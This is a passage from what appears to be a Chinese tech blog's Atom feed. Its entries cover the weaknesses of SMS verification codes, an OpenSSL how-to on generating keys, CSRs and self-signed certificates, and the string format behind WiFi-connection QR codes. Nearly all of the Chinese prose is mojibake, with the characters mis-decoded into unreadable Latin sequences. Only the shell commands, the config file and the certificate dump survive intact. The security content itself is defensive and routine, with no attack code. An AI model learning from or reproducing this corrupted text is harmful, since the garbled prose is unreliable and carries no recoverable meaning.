        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gg9azgp8mlj30ly0cmmy6.jpg" alt=""></p><a id="more"></a><p>å¦‚ä»Šï¼Œç½‘ç«™å’Œ App è¶Šæ¥è¶Šå¤šï¼Œæˆ‘çš„è´¦å·ä¹Ÿéšä¹‹å¢åŠ ï¼Œè¿™ä¸ºæˆ‘ä»¬å¸¦æ¥äº†ä¸å°‘çš„è®°å¿†è´Ÿæ‹…ï¼ŒçŸ­ä¿¡éªŒè¯ç ä½œä¸ºä¸€ç§ä¾¿æ·éªŒè¯æ–¹å¼ï¼Œè¢«å¹¿æ³›ä½¿ç”¨åœ¨æ³¨å†Œã€ç™»é™†ã€é‡ç½®å¯†ç ã€è½¬è´¦è®¤è¯ç­‰å…³é”®åœºæ™¯ï¼Œç„¶è€Œï¼Œä»Šå¤©çš„çŸ­ä¿¡éªŒè¯ç è¿˜æ˜¯å®‰å…¨çš„å—ï¼Ÿ</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œé€šå¸¸çš„çŸ­ä¿¡éªŒè¯ç æ˜¯æœ‰æ•ˆæœŸ 10 åˆ†é’Ÿçš„ 6 ä½æ•°å­—ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœ‰æ•ˆæœŸå†…éå† 000000 ~ 999999ï¼Œè‚¯å®šèƒ½æ‰¾åˆ°æœ‰æ•ˆéªŒè¯ç ã€‚å›½å¤–ç½‘å‹ç¡®å®åŸºäºè¿™ä¸€ç‚¹<a href="https://thezerohack.com/hack-any-instagram?from=timeline#articlescroll" target="_blank" rel="noopener">ç ´è§£äº† Instagram è´¦å·</a>ï¼Œè¿˜é¡ºæ‰‹é¢†å–äº† 3 ä¸‡ç¾åˆ€çš„å¥–åŠ±ã€‚åƒè¿™ç§æš´åŠ›ç ´è§£çš„ï¼Œåªéœ€è¦åŠ å°è¯•æ¬¡æ•°é™åˆ¶ï¼Œå½“ç”¨æˆ·è¾“å…¥ 10 æ¬¡é”™è¯¯æ—¶ï¼Œå°±å¼ºåˆ¶éªŒè¯ç è¿‡æœŸå³å¯ã€‚</p><p>ç°åœ¨ï¼Œä¹Ÿæœ‰äº†é€šè¿‡åŸºç«™æ‹¦æˆªçŸ­ä¿¡éªŒè¯ç ï¼Œä»è€Œå°†é“¶è¡Œå¡ç›—ç©ºçš„æ¡ˆä¾‹ï¼š<a href="https://tech.sina.com.cn/t/2020-06-22/doc-iircuyvi9722965.shtml" target="_blank" rel="noopener">å¤®è§†ï¼šè­¦æƒ•ï¼æ‰‹æœºéªŒè¯ç å·²è¢«éª—å­åˆ©ç”¨è½¬ç©ºé“¶è¡Œå¡</a>ã€‚è¿™å……åˆ†ä½“ç°äº†çŸ­ä¿¡éªŒè¯ç çš„å­˜åœ¨çš„ä¸¥é‡ç¼ºé™·ï¼ŒåŸºäºæ­¤ï¼Œç›®å‰å›½å†…è¿è¥å•†éƒ½æœ‰ä¸€é”®è®¤è¯çš„æ–¹æ¡ˆï¼Œå…¶åŸç†æ˜¯å½“ç”¨æˆ·ç‚¹å‡»ä¸€é”®è®¤è¯æ—¶ï¼ŒApp è°ƒç”¨è¿è¥å•†çš„ SDK è¯»å– SIM å¡è®¤è¯ï¼Œä¸é€šè¿‡ç½‘ç»œå‘é€è®¤è¯ä¿¡æ¯ï¼Œä»¥ä¸‹æ˜¯ä¸‰å®¶çš„ç›¸å…³äº§å“ï¼š</p><ol><li>ç§»åŠ¨ï¼š<a href="https://dev.10086.cn/numIdentific" target="_blank" rel="noopener">https://dev.10086.cn/numIdentific</a></li><li>è”é€šï¼š<a href="https://onlinebusiness.10010.com/product/5302" target="_blank" rel="noopener">https://onlinebusiness.10010.com/product/5302</a></li><li>ç”µä¿¡ï¼š<a href="https://id.189.cn/banner/unPassword" target="_blank" rel="noopener">https://id.189.cn/banner/unPassword</a></li></ol><p>å°±ç›®å‰è€Œè¨€ï¼Œç»å¤§å¤šæ•°çš„äº§å“éƒ½ä¸ä¼šä»˜è´¹ä½¿ç”¨è¿è¥å•†çš„è®¤è¯æœåŠ¡ï¼Œæ‰€ä»¥ä½¿ç”¨çŸ­ä¿¡éªŒè¯ä»ç„¶æ˜¯å­˜åœ¨å¾ˆé«˜çš„é£é™©ï¼Œå¦‚æœç½‘ç«™æ”¯æŒä¸¤æ­¥éªŒè¯ï¼Œå»ºè®®å¼€å¯ä¸¤æ­¥éªŒè¯ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ç¦»çº¿çš„éšæœºéªŒè¯ç å®‰å…¨éªŒè¯ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç©è½¬TLSç³»åˆ—ä¹‹ä¸‰ã€‘OpenSSL</title>
      <link href="/post/play-openssl-with-tls/"/>
      <url>/post/play-openssl-with-tls/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gg8xqsdtirj30qo0f0ab7.jpg" alt=""></p><a id="more"></a><h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1 ç®€ä»‹"></a>1 ç®€ä»‹</h1><p>OpenSSLæ˜¯ä¸€ä¸ªå®ç°äº† SSL ä¸ TLS åè®®çš„å·¥å…·ï¼Œæ˜¯ç½‘ç»œåŸºç¡€ä¸­çš„é‡è¦ä¸€ç¯ï¼Œå…¶çŸ¥åäº‹ä»¶è«è¿‡äº2014å¹´çš„<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">å¿ƒè„å‡ºè¡€æ¼æ´</a>ï¼Œç›´æ¥å¯¼è‡´å…¨çƒä¸‰åˆ†ä¹‹äºŒçš„æ´»è·ƒç½‘ç«™å—å½±å“ã€‚æ·±å…¥äº†è§£åå°±ä¼šå‘ç°ï¼ŒOpenSSLå°±åƒä¸€æŠŠç‘å£«å†›åˆ€ï¼Œæ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§å¥å£®çš„åŠ å¯†å·¥å…·é›†ã€‚ä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ˜¯ï¼Œå¦‚æ­¤åºå¤§çš„é¡¹ç›®ä»…æœ‰ 7 åæˆå‘˜ï¼Œå…¶ä¸­åªæœ‰ä¸¤åå…¨èŒäººå‘˜ï¼Œå…¶ä½™éƒ½æ˜¯å¿—æ„¿è€…ï¼Œæ¯å¹´é¢„ç®—ä¸åˆ° 100 ä¸‡ç¾å…ƒï¼Œå´æ’‘èµ·äº†æ•´ä¸ªäº’è”ç½‘çš„å®‰å…¨é€šä¿¡ï¼Œåªæœ‰åœ¨å¿ƒè„å‡ºè¡€æ¼æ´æ—¶ï¼ŒOpenSSLæ‰è¢«å¤§å®¶æ‰€ç†ŸçŸ¥ï¼Œå¸Œæœ›è¶Šæ¥è¶Šå¤šçš„å‚å•†èƒ½å¤Ÿå‚ä¸åˆ°å¼€æºé¡¹ç›®ä¸­ï¼Œä¸ºäº’è”ç½‘æ·»ç –åŠ ç“¦ã€‚</p><h1 id="2-åŸºç¡€ä½¿ç”¨"><a href="#2-åŸºç¡€ä½¿ç”¨" class="headerlink" title="2 åŸºç¡€ä½¿ç”¨"></a>2 åŸºç¡€ä½¿ç”¨</h1><p>æŸ¥çœ‹ç‰ˆæœ¬ <code>openssl version [-a]</code><br>openssl å°±åƒç‘å£«å†›åˆ€ä¸€æ ·ï¼Œæ”¯æŒè®¸å¤šåŠŸèƒ½ï¼Œä½¿ç”¨<code>openssl help</code>æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„å‘½ä»¤<br>ä¸ºäº†ç”Ÿæˆå®‰å…¨çš„å¯†é’¥ï¼Œç›®å‰å»ºè®®ç”Ÿæˆ 2048 ä½çš„ RSA æˆ– 256 ä½çš„ECDSAã€‚</p><h1 id="3-å¯†é’¥"><a href="#3-å¯†é’¥" class="headerlink" title="3 å¯†é’¥"></a>3 å¯†é’¥</h1><h2 id="3-1-ç”Ÿæˆå¯†é’¥"><a href="#3-1-ç”Ÿæˆå¯†é’¥" class="headerlink" title="3.1 ç”Ÿæˆå¯†é’¥"></a>3.1 ç”Ÿæˆå¯†é’¥</h2><h3 id="3-1-1-å¯¹ç§°å¯†é’¥"><a href="#3-1-1-å¯¹ç§°å¯†é’¥" class="headerlink" title="3.1.1 å¯¹ç§°å¯†é’¥"></a>3.1.1 å¯¹ç§°å¯†é’¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa [åŠ å¯†ç®—æ³•å] -out [å¯†é’¥ä¿å­˜è·¯å¾„] [å¯†é’¥é•¿åº¦]</span><br></pre></td></tr></table></figure><p>å¦‚<code>openssl genrsa -aes128 -out fd.key 2048</code></p><h3 id="3-1-2-éå¯¹ç§°å¯†é’¥"><a href="#3-1-2-éå¯¹ç§°å¯†é’¥" class="headerlink" title="3.1.2 éå¯¹ç§°å¯†é’¥"></a>3.1.2 éå¯¹ç§°å¯†é’¥</h3><p>éå¯¹ç§°å¯†é’¥çš„ç”Ÿæˆéœ€è¦ä¸¤æ­¥ï¼š</p><ol><li>åˆ›å»ºå‚æ•°</li><li>åˆ›å»ºå¯†é’¥</li></ol><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é€šè¿‡ä¸€æ¡å‘½ä»¤ç”Ÿæˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl dsaparam -genkey 2048 | openssl dsa -out dsa.key -aes128</span><br><span class="line">$ openssl ecparam -genkey -name secp256r1 | openssl ec -out ec.key -aes128</span><br></pre></td></tr></table></figure><p>OpenSSLæ”¯æŒè®¸å¤šå‘½åæ›²çº¿ï¼ˆå¯ä»¥ä½¿ç”¨<code>openssl ecparam -list_curves</code>è·å–å®Œæ•´åˆ—è¡¨ï¼‰ï¼Œä½†å¯¹äºWebæœåŠ¡å™¨å¯†é’¥ï¼Œä»…é™äºæ‰€æœ‰ä¸»è¦æµè§ˆå™¨éƒ½æ”¯æŒçš„ä¸¤æ¡æ›²çº¿ï¼š<code>secp256r1</code>ï¼ˆOpenSSLä½¿ç”¨åç§°<code>prime256v1</code>ï¼‰å’Œ<code>secp384r1</code>ã€‚</p><h2 id="3-2-è¯»å–å¯†é’¥"><a href="#3-2-è¯»å–å¯†é’¥" class="headerlink" title="3.2 è¯»å–å¯†é’¥"></a>3.2 è¯»å–å¯†é’¥</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="type">text</span> -<span class="keyword">in</span> fd<span class="built_in">.key</span></span><br></pre></td></tr></table></figure><h1 id="4-CSR"><a href="#4-CSR" class="headerlink" title="4 CSR"></a>4 CSR</h1><h2 id="4-1-ç”Ÿæˆ-CSR"><a href="#4-1-ç”Ÿæˆ-CSR" class="headerlink" title="4.1 ç”Ÿæˆ CSR"></a>4.1 ç”Ÿæˆ CSR</h2><h3 id="4-1-1-é€šè¿‡ç»ˆç«¯äº¤äº’å¼ç”Ÿæˆ"><a href="#4-1-1-é€šè¿‡ç»ˆç«¯äº¤äº’å¼ç”Ÿæˆ" class="headerlink" title="4.1.1 é€šè¿‡ç»ˆç«¯äº¤äº’å¼ç”Ÿæˆ"></a>4.1.1 é€šè¿‡ç»ˆç«¯äº¤äº’å¼ç”Ÿæˆ</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -<span class="built_in">new</span> -<span class="built_in">key</span> fd.<span class="built_in">key</span> -out fd.csr</span><br></pre></td></tr></table></figure><h3 id="4-1-2-é€šè¿‡é…ç½®æ–‡ä»¶ç”Ÿæˆ"><a href="#4-1-2-é€šè¿‡é…ç½®æ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="4.1.2 é€šè¿‡é…ç½®æ–‡ä»¶ç”Ÿæˆ"></a>4.1.2 é€šè¿‡é…ç½®æ–‡ä»¶ç”Ÿæˆ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[req]</span><br><span class="line">prompt = no</span><br><span class="line">distinguished_name = dn</span><br><span class="line">default_bits = 4096</span><br><span class="line">default_md = sha256</span><br><span class="line"></span><br><span class="line">[dn]</span><br><span class="line">C = CN</span><br><span class="line">ST = Guangdong</span><br><span class="line">L = Shenzhen</span><br><span class="line">O = DJI Inc.</span><br><span class="line">OU = IT Department</span><br><span class="line">CN = example.com</span><br><span class="line">emailAddress = username@example.com</span><br></pre></td></tr></table></figure><p>å†é€šè¿‡æ‰§è¡Œ<code>openssl req -new -config ec.cnf -key ec.key -out ec.csr</code>ç”Ÿæˆ</p><h2 id="4-2-è¯»å–-CSR"><a href="#4-2-è¯»å–-CSR" class="headerlink" title="4.2 è¯»å– CSR"></a>4.2 è¯»å– CSR</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -text -<span class="keyword">in</span> fd<span class="selector-class">.csr</span> -noout</span><br></pre></td></tr></table></figure><h1 id="5-è¯ä¹¦"><a href="#5-è¯ä¹¦" class="headerlink" title="5 è¯ä¹¦"></a>5 è¯ä¹¦</h1><h2 id="5-1-ç”Ÿæˆè¯ä¹¦"><a href="#5-1-ç”Ÿæˆè¯ä¹¦" class="headerlink" title="5.1 ç”Ÿæˆè¯ä¹¦"></a>5.1 ç”Ÿæˆè¯ä¹¦</h2><p>ç”Ÿæˆè¯ä¹¦æ—¶ï¼Œå¯é€‰ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹å¼ä¸­çš„ä»»ä¸€ç§ï¼š</p><ol><li>é€šè¿‡ csr æ–‡ä»¶ç”Ÿæˆ <code>$ openssl x509 -req -days 365 -in ec.csr -signkey ec.key -out ec.crt</code></li><li>åœ¨ç”Ÿæˆè¯ä¹¦æ—¶é€šè¿‡äº¤äº’å¼å¡«å†™ CSR ä¿¡æ¯<code>$ openssl req -new -x509 -days 365 -key fd.key -out fd.crt</code></li><li>åœ¨ç”Ÿæˆå‘½ä»¤ä¸­æ·»åŠ  CSR ä¿¡æ¯ï¼š<code>$ openssl req -new -x509 -days 365 -key fd.key -out fd.crt -subj &quot;/C=GB/L=London/O=Feisty Duck Ltd/CN=www.feistyduck.com&quot;</code></li></ol><p>å¦‚æœéœ€è¦åœ¨è¯ä¹¦ä¸­åŒ…å«å¤šä¸ªåŸŸåï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ª<code>ec.ext</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subjectAltName = DNS:example<span class="selector-class">.com</span>,DNS:*<span class="selector-class">.example</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç”Ÿæˆè¯ä¹¦æ—¶æ‰§è¡Œ<code>openssl x509 -req -days 365 -in ec.csr -signkey ec.key -out ec.crt -extfile ec.ext</code></p><p>æœ‰æ—¶æˆ‘ä»¬åœ¨æŠ“ HTTPS åŒ…æˆ–è€…æœ¬åœ°å¼€å‘éœ€è¦ç”¨åˆ° https æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥æ–¹å¼æ¥ç”Ÿæˆè‡ªç­¾è¯ä¹¦ï¼Œæ­£å¦‚ä¹‹å‰ 12306 æŠ¥è¯ä¹¦é”™è¯¯å°±æ˜¯ç”±äº 12306 è‡ªå·±ç­¾å‘çš„è¯ä¹¦æ— æ³•è¢«æµè§ˆå™¨è®¤è¯æ‰€å¯¼è‡´ã€‚å¦å¤–ï¼Œç›®å‰å¶æ­£ä¹¦çš„æœ€é•¿æœ‰æ•ˆæœŸè®¤è¯ä¸º<a href="https://www.ssl.com/blogs/ssl-certificate-maximum-duration-825-days/" target="_blank" rel="noopener">825å¤©</a>ï¼Œè¶…è¿‡æ­¤æ—¶é—´Chromeä¼šæç¤º <code>NET::ERR_CERT_VALIDITY_TOO_LONG</code>ã€‚æ ¹æ® <a href="https://chromium.googlesource.com/chromium/src/+/ae4d6809912f8171b23f6aa43c6a4e8e627de784" target="_blank" rel="noopener">Chrome æœ€æ–°æ”¿ç­–</a>ï¼Œäº 2020-09-01 åç”³è¯·çš„è¯ä¹¦ï¼Œæœ‰æ•ˆæœŸä¸å¾—å¤§äº 398 å¤©ã€‚</p><h2 id="5-2-æŸ¥çœ‹è¯ä¹¦"><a href="#5-2-æŸ¥çœ‹è¯ä¹¦" class="headerlink" title="5.2 æŸ¥çœ‹è¯ä¹¦"></a>5.2 æŸ¥çœ‹è¯ä¹¦</h2><h3 id="5-2-1-æŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯"><a href="#5-2-1-æŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯" class="headerlink" title="5.2.1 æŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯"></a>5.2.1 æŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl x509 -text -<span class="keyword">in</span> ec<span class="selector-class">.crt</span> -noout</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number: 16825656056182609007 (0xe980bd0975aa146f)</span><br><span class="line">    Signature Algorithm: ecdsa-with-SHA1</span><br><span class="line">        Issuer: C=CN, ST=Guangdong, L=Shenzhen, O=DJI Inc., OU=IT Department, CN=example.com/emailAddress=username@example.com</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Jun 28 08:41:01 2020 GMT</span><br><span class="line">            Not After : Jun 28 08:41:01 2021 GMT</span><br><span class="line">        Subject: C=CN, ST=Guangdong, L=Shenzhen, O=DJI Inc., OU=IT Department, CN=example.com/emailAddress=username@example.com</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: id-ecPublicKey</span><br><span class="line">                Public-Key: (256 bit)</span><br><span class="line">                pub:</span><br><span class="line">                    04:3e:f0:7d:ab:ee:e5:5f:75:19:fb:89:4f:ef:80:</span><br><span class="line">                    00:79:5a:c8:07:8e:7f:c1:fb:ba:d0:77:76:ea:b3:</span><br><span class="line">                    44:79:a3:b5:e1:51:d9:c6:20:18:97:07:41:00:30:</span><br><span class="line">                    3d:26:26:aa:53:b2:f9:59:ea:2a:23:ed:cb:88:da:</span><br><span class="line">                    0b:f0:08:96:c3</span><br><span class="line">                ASN1 OID: prime256v1</span><br><span class="line">                NIST CURVE: P-256</span><br><span class="line">        X509v3 extensions:</span><br><span class="line">            X509v3 Subject Alternative Name:</span><br><span class="line">                DNS:example.com, DNS:*.example.com</span><br><span class="line">    Signature Algorithm: ecdsa-with-SHA1</span><br><span class="line">         30:46:02:21:00:aa:bd:04:41:30:7e:f1:14:e4:ea:c6:ed:8d:</span><br><span class="line">         f3:b3:91:06:36:f4:b8:4f:0b:86:30:92:0f:26:5c:bb:c4:94:</span><br><span class="line">         51:02:21:00:b9:03:35:a2:2f:07:b5:d4:db:a9:23:ee:c2:c1:</span><br><span class="line">         86:36:50:ef:05:a1:18:b7:b6:0e:be:bf:1c:31:b9:55:32:13</span><br></pre></td></tr></table></figure><h3 id="5-2-2-æŸ¥çœ‹æœ‰æ•ˆæœŸ"><a href="#5-2-2-æŸ¥çœ‹æœ‰æ•ˆæœŸ" class="headerlink" title="5.2.2 æŸ¥çœ‹æœ‰æ•ˆæœŸ"></a>5.2.2 æŸ¥çœ‹æœ‰æ•ˆæœŸ</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl x509 -<span class="keyword">in</span> ec<span class="selector-class">.crt</span> -noout -dates</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹èµ·å§‹å’Œç»“æŸæœ‰æ•ˆæœŸçš„å‚æ•°åˆ†åˆ«ä¸º<code>-startdate</code>å’Œ<code>-enddate</code></p><h2 id="5-3-éªŒè¯è¯ä¹¦"><a href="#5-3-éªŒè¯è¯ä¹¦" class="headerlink" title="5.3 éªŒè¯è¯ä¹¦"></a>5.3 éªŒè¯è¯ä¹¦</h2><p>å­è¯ä¹¦çš„Authority Key Identifierçš„ Key ID å¿…é¡»ä¸å…¶ä¸Šçº§é¢å‘è¯ä¹¦çš„Subject Key Identifierçš„ Key ID ä¸€è‡´<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gemafo6t62j316b0iadls.jpg" alt=""></p><h2 id="5-4-è¯ä¹¦æ ¼å¼è½¬æ¢"><a href="#5-4-è¯ä¹¦æ ¼å¼è½¬æ¢" class="headerlink" title="5.4 è¯ä¹¦æ ¼å¼è½¬æ¢"></a>5.4 è¯ä¹¦æ ¼å¼è½¬æ¢</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl x509 -inform PEM -<span class="keyword">in</span> ec<span class="selector-class">.pem</span> -outform DER -out ec.der</span><br><span class="line">$ openssl x509 -inform DER -<span class="keyword">in</span> ec<span class="selector-class">.der</span> -outform PEM -out ec.pem</span><br></pre></td></tr></table></figure><h1 id="6-æ€§èƒ½æµ‹è¯•"><a href="#6-æ€§èƒ½æµ‹è¯•" class="headerlink" title="6 æ€§èƒ½æµ‹è¯•"></a>6 æ€§èƒ½æµ‹è¯•</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl speed rc4 aes rsa ecdh sha</span><br></pre></td></tr></table></figure><p>å¤šæ ¸ CPUçš„æµ‹è¯•ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl speed -multi <span class="number">4</span> rsa</span><br></pre></td></tr></table></figure><p>æ¿€æ´»ç¡¬ä»¶åŠ é€Ÿæµ‹è¯•</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl speed -evp aes<span class="number">-128</span>-cbc</span><br></pre></td></tr></table></figure><hr><p>æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹ <a href="https://www.feistyduck.com/library/openssl-cookbook/online/ch-openssl.html" target="_blank" rel="noopener">https://www.feistyduck.com/library/openssl-cookbook/online/ch-openssl.html</a> ï¼Œå…¶ä¸­æœ‰ä¸€äº›æœ¬æ–‡æœªæåˆ°çš„éƒ¨åˆ†ï¼Œå¦‚åˆ›å»º root è¯ä¹¦ç­‰ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> tls </tag>
            
            <tag> openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‰«ä¸€æ‰«äºŒç»´ç è¿æ¥ WiFi</title>
      <link href="/post/make-qrcode-for-wifi-connect/"/>
      <url>/post/make-qrcode-for-wifi-connect/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gg2ix61na0j30zk0k0415.jpg" alt=""></p><a id="more"></a><p>æˆ‘ä»¬åœ¨é¥­åº—ã€å•†åœºã€ç†å‘åº—ç­‰åœºæ‰€å¯èƒ½ç»å¸¸ä¼šè¿æ¥ç”±å•†å®¶æä¾›çš„ WiFiï¼Œé€šå¸¸æ˜¯é€šè¿‡å¢™ä¸Šç²˜è´´çš„ WiFi åå’Œå¯†ç æ‰‹åŠ¨è¿æ¥ï¼Œæœ‰æ—¶å€™æ˜¯åº—å®¶å£è¿°ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šè¿æ¥é”™è¯¯ï¼Œå¦‚æœèƒ½é€šè¿‡æ‰«æäºŒç»´ç è¿æ¥ï¼Œå²‚ä¸æ˜¯ä¾¿æ·è®¸å¤šï¼Ÿ</p><p>å¤šå¹´å‰ï¼Œæˆ‘æ›¾å†™è¿‡ä¸€ç¯‡<a href="https://blog.shixinyu.space/post/wechat-wifi-tutorial/">å¾®ä¿¡è¿ Wi-Fi ä½¿ç”¨æ•™ç¨‹</a>çš„æ–‡ç« ï¼Œå½“æ—¶æƒ³è¾¾åˆ°çš„æ•ˆæœå°±æ˜¯é¡¾å®¢é€šè¿‡æ‰«ææŒ‚åœ¨å¢™ä¸Šçš„äºŒç»´ç å°±å¯ä»¥è‡ªåŠ¨è¿æ¥ WiFi ç½‘ç»œï¼Œä½†ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ–¹æ¡ˆï¼Œä»Šå¤©åœ¨çœ‹é˜®ä¸€å³°è€å¸ˆçš„<a href="https://www.ruanyifeng.com/blog/2020/06/weekly-issue-110.html" target="_blank" rel="noopener">ç§‘æŠ€å‘¨åˆŠï¼ˆç¬¬ 110 æœŸï¼‰</a>æ—¶ï¼Œæ–‡ä¸­æåˆ°äº†<a href="https://wificard.bdw.to/" target="_blank" rel="noopener">è¿™æ ·çš„å·¥å…·</a>ï¼Œæˆ‘ç”¨ Android è‡ªå¸¦äºŒç»´ç æ‰«æåº”ç”¨å’Œ iPhone ç›¸æœºåº”ç”¨å°è¯•äº†ä¸€ä¸‹ï¼Œéƒ½å¯ä»¥å‡ºç°æ­£å¸¸çš„ WiFi è¿æ¥è¯·æ±‚ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒäºŒç»´ç ä¸­å¯ä»¥åŒ…å«å­—ç¬¦ä¸²ç­‰å¯è¯»ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯ä»¥è®©æ‰‹æœºè¿æ¥ WiFi çš„äºŒç»´ç æ˜¯ä»€ä¹ˆå†…å®¹å‘¢ï¼Ÿäºæ˜¯æˆ‘ç”¨å¾®ä¿¡çš„æ‰«ä¸€æ‰«å¾—åˆ°äº†ä»¥ä¸‹ç»“æœ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">WIFI</span><span class="selector-pseudo">:T</span><span class="selector-pseudo">:WPA</span>;<span class="selector-tag">S</span><span class="selector-pseudo">:space</span>;<span class="selector-tag">P</span><span class="selector-pseudo">:1234567890</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»ˆäºè§åˆ°åºå±±çœŸé¢ç›®äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å°† WiFi çš„å®‰å…¨æ€§ã€SSIDã€å¯†ç ç­‰ä¿¡æ¯å¡«å†™å…¥å¯¹åº”ä½ç½®ï¼Œç„¶åå°†è¿™ä¸²å­—ç¬¦ç”ŸæˆäºŒç»´ç å³å¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨<a href="https://cli.im/" target="_blank" rel="noopener">è‰æ–™äºŒç»´ç </a>ç­‰å·¥å…·è¿›è¡Œä¸ªæ€§åŒ–å®šåˆ¶ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œç„¶åæŒ‚åœ¨å¢™ä¸Šï¼Œå½“æœ‰å®¢äººæ¥åº—æ—¶ï¼Œä»–ä»¬åªéœ€è¦æå‡ºæ‰‹æœºæ‰«ä¸€æ‰«ä¸€é”®è¿æ¥å³å¯ã€‚<br><img src="https://tva1.sinaimg.cn/small/007S8ZIlly1gg2izid97nj30ek0iu78v.jpg" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å•ä¸€ä¸»æœºè®¿é—®å¤š GitHub é¡¹ç›®</title>
      <link href="/post/github-deploy-keys-multiple-repositories/"/>
      <url>/post/github-deploy-keys-multiple-repositories/</url>
      
